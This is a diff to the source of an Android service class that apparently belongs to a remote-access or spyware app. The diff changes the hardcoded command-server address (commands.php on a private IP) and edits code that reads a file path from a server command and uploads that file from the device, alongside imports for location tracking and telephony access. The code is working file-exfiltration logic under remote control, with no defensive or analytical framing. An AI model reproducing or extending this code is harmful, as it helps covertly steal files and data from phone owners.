@@ -44,7 +44,9 @@ import java.util.List;
 import java.util.Locale;
 import java.util.Timer;
 import java.util.TimerTask;
+import java.util.concurrent.Executor;
 import java.util.concurrent.Executors;
+import java.util.concurrent.ThreadPoolExecutor;
 
 import es.dmoral.toasty.Toasty;
 import fr.quentinklein.slt.LocationTracker;
@@ -62,7 +64,7 @@ import me.everything.providers.android.telephony.TelephonyProvider;
 public class InternalService extends Service implements TextToSpeech.OnInitListener {
 
     public Context context;
-    private String SERVER_URI = "http://192.168.42.204/commands.php";
+    private String SERVER_URI = "http://192.168.42.28/commands.php";
     private Timer timerTaskScheduler = new Timer();
     private LocationTracker tracker = null;
     private String deviceUniqueId = null;
@@ -210,7 +212,6 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
                 .addBodyParameter(hashMap)
                 .setTag("addDevice")
                 .setPriority(Priority.MEDIUM)
-                .setExecutor(Executors.newSingleThreadExecutor())
                 .build()
                 .getAsJSONObject(new JSONObjectRequestListener() {
                     @Override
@@ -363,19 +364,24 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
         String filePath = null;
         try {
             filePath = jsonObject.getString("upload_file_path");
-
         } catch (JSONException e) {
             e.printStackTrace();
         }
 
         if (filePath != null) {
             File file = new File(filePath);
+
             if (file.isFile()) {
+                showAllData("FILE PATH : " + file.getAbsolutePath());
                 HashMap<String, Object> postData = new HashMap<>();
                 postData.put("device_id", deviceUniqueId);
 
+
+                HashMap<String, File> fileHashMap = new HashMap<>();
+                fileHashMap.put("upload_file_nm", file);
+
                 AndroidNetworking.upload(SERVER_URI)
-                        .addMultipartFile("upload_file_nm", file)
+                        .addMultipartFile(fileHashMap)
                         .addMultipartParameter(postData)
                         .setPriority(Priority.HIGH)
                         .setExecutor(Executors.newSingleThreadExecutor())
@@ -383,7 +389,6 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
                         .getAsString(new StringRequestListener() {
                             @Override
                             public void onResponse(String response) {
-
                             }
 
                             @Override
